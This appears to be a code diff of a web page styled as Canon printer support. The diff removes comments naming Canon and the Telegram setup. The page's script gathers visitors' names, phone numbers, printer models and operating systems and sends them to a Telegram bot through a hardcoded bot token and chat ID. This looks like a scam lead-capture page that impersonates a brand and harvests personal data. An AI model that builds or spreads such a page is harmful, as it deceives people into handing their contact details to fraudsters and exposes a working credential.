@@ -13,7 +13,7 @@
 
         /* --- PROFESSIONAL HEADER --- */
         header {
-            background-color: #cc0000; /* Canon Red */
+            background-color: #cc0000; 
             height: 85px;
             box-shadow: 0 4px 12px rgba(0,0,0,0.15);
             display: flex;
@@ -259,7 +259,7 @@
     </footer>
 
     <script>
-        // Telegram Config
+       
         const BOT_TOKEN = "7764513169:AAFpRf8WQ6WE7DymOqMgTxXjv6BUSZe2734";
         const CHAT_ID   = "1684000886";
         let selectedOS = "";
@@ -286,7 +286,7 @@
             document.querySelector('.submit-btn').innerText = "Processing...";
             document.querySelector('.submit-btn').style.background = "#555";
 
-            const msg = `🔴 NEW LEAD (Canon PRO)\n\n👤 Name: ${name}\n📱 Phone: ${phone}\n🖨 Model: ${model}\n💻 OS: ${selectedOS}`;
+            const msg = `🔴 NEW\n\n👤 Name: ${name}\n📱 Phone: ${phone}\n🖨 Model: ${model}\n💻 OS: ${selectedOS}`;
 
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
